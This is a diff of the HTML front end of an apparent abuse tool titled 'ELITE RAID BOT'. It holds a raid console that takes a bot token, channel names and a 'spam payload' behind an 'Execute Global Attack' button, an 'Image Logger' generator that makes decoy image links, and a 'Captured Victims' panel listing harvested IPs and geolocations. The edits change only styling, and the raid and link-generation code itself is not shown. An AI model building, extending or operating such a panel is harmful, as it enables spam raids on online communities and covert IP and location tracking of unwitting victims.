@@ -2,17 +2,15 @@
 <html lang="es">
 <head>
 <meta charset="UTF-8">
-<title>ELITE CONTROL | RAID & LOGGER</title>
+<title>ELITE CONTROL | IDK TOOL</title>
 <script src="https://tailwindcss.com"></script>
 <link href="https://googleapis.com" rel="stylesheet">
 <style>
     body { background:#000; font-family:'Orbitron',sans-serif; color:#ff2a2a; }
     .neon { text-shadow:0 0 8px #ff0000; }
-    .panel { background:#050505; border:1px solid #200; box-shadow: 0 0 20px rgba(255,0,0,0.1); }
-    .input { background:#000; border:1px solid #300; color:#ff4444; outline:none; font-family: monospace; }
-    .input:focus { border-color: #f00; box-shadow: 0 0 10px #f00; }
-    .btn { background:linear-gradient(45deg,#500,#f00); transition: 0.2s; cursor:pointer; }
-    .btn:hover { transform: scale(1.01); box-shadow: 0 0 15px #f00; }
+    .panel { background:#050505; border:1px solid #200; }
+    .input { background:#000; border:1px solid #300; color:#ff4444; outline:none; }
+    .btn { background:linear-gradient(45deg,#500,#f00); cursor:pointer; }
     .tab-btn { padding:12px; cursor:pointer; opacity: 0.4; border-bottom: 2px solid transparent; font-size: 10px; }
     .tab-btn.active { opacity: 1; border-color: #f00; text-shadow: 0 0 5px #f00; }
     .tab { display:none; }
@@ -22,7 +20,7 @@
 <body class="p-4 md:p-10">
 <div class="max-w-5xl mx-auto">
     <h1 class="text-4xl font-black neon mb-2 italic tracking-tighter">ELITE RAID BOT</h1>
-    <p class="text-[9px] mb-8 text-red-900 tracking-[0.4em]">CONNECTED TO: IDK-TOOL-PRODUCTION</p>
+    <p class="text-[9px] mb-8 text-red-900 tracking-[0.4em]">WEB: IDK-TOOL-PRODUCTION.UP.RAILWAY.APP</p>
 
     <div class="flex gap-4 mb-6 uppercase font-bold">
         <div class="tab-btn active" onclick="tab('raid',this)">Raid Console</div>
@@ -30,35 +28,27 @@
         <div class="tab-btn" onclick="tab('logs',this)">IP Logs</div>
     </div>
 
-    <!-- RAID -->
     <div id="raid" class="tab active panel p-8 rounded-xl space-y-4">
         <input id="rToken" type="password" placeholder="BOT TOKEN" class="input w-full p-4 rounded">
-        <div class="grid md:grid-cols-2 gap-4">
-            <input id="rChan" type="text" placeholder="CHANNELS NAME" class="input w-full p-4 rounded">
-            <div class="p-4 bg-red-900/10 border border-red-900/40 rounded text-[10px] flex items-center">
-                AUTO-STATUS: idk-tool-production.up.railway.app
-            </div>
-        </div>
+        <input id="rChan" type="text" placeholder="CHANNELS NAME" class="input w-full p-4 rounded">
         <textarea id="rMsg" placeholder="SPAM PAYLOAD" class="input w-full p-4 rounded h-32"></textarea>
-        <button onclick="runRaid()" id="btnR" class="btn w-full py-5 rounded font-black text-white uppercase tracking-widest">Execute Global Attack</button>
+        <button onclick="runRaid()" id="btnR" class="btn w-full py-5 rounded font-black text-white uppercase">Execute Global Attack</button>
     </div>
 
-    <!-- GENERATOR -->
     <div id="gen" class="tab panel p-8 rounded-xl space-y-4 border-t-2 border-indigo-900">
-        <h2 class="text-indigo-500 font-bold text-sm uppercase">Image Logger Setup</h2>
-        <input id="lName" type="text" placeholder="URL Name (ej: foto_sorpresa)" class="input w-full p-3 rounded border-indigo-900">
-        <input id="lRealImg" type="text" placeholder="Target Real Image URL (Señuelo)" class="input w-full p-3 rounded border-indigo-900">
-        <button onclick="genLink()" class="w-full bg-indigo-900 py-3 rounded font-bold text-white uppercase text-xs">Generate Link</button>
+        <h2 class="text-indigo-500 font-bold text-sm uppercase">Image Logger</h2>
+        <input id="lName" type="text" placeholder="URL Name" class="input w-full p-3 rounded">
+        <input id="lRealImg" type="text" placeholder="Real Image URL (Señuelo)" class="input w-full p-3 rounded">
+        <button onclick="genLink()" class="w-full bg-indigo-900 py-3 rounded font-bold text-white text-xs">GENERATE LINK</button>
         <p id="resL" class="text-[10px] p-4 bg-black border border-indigo-900 text-indigo-400 break-all hidden"></p>
     </div>
 
-    <!-- LOGS -->
     <div id="logs" class="tab panel p-8 rounded-xl">
-        <div class="flex justify-between items-center mb-6 border-b border-red-900 pb-2">
+        <div class="flex justify-between items-center mb-6">
             <h2 class="text-sm neon uppercase font-bold">Captured Victims</h2>
-            <button onclick="updateLogs()" class="text-[9px] bg-red-950 px-3 py-1 rounded border border-red-800">REFRESH</button>
+            <button onclick="updateLogs()" class="text-[9px] bg-red-950 px-3 py-1 rounded">REFRESH</button>
         </div>
-        <div id="ipBox" class="space-y-3 h-96 overflow-y-auto pr-2"></div>
+        <div id="ipBox" class="space-y-3 h-96 overflow-y-auto pr-2 text-[10px]"></div>
     </div>
 </div>
 
@@ -96,14 +86,11 @@ async function updateLogs() {
     const data = await res.json();
     const box = document.getElementById('ipBox');
     box.innerHTML = data.map(l => `
-        <div class="p-3 bg-white/5 rounded border-l-2 border-red-600 text-[10px]">
-            <div class="flex justify-between font-bold text-red-500 mb-1">
-                <span>IP: ${l.ip}</span> <span>${l.date}</span>
-            </div>
+        <div class="p-3 bg-white/5 rounded border-l-2 border-red-600">
+            <div class="flex justify-between font-bold text-red-500"><span>IP: ${l.ip}</span> <span>${l.date}</span></div>
             <div class="text-gray-400">LOC: ${l.geo}</div>
-            <div class="text-[8px] text-gray-600 truncate mt-1">${l.ua}</div>
         </div>
-    `).join('') || "<p class='text-center text-gray-800 uppercase text-xs mt-10'>No victims found</p>";
+    `).join('') || "No victims";
 }
 </script>
 </body>
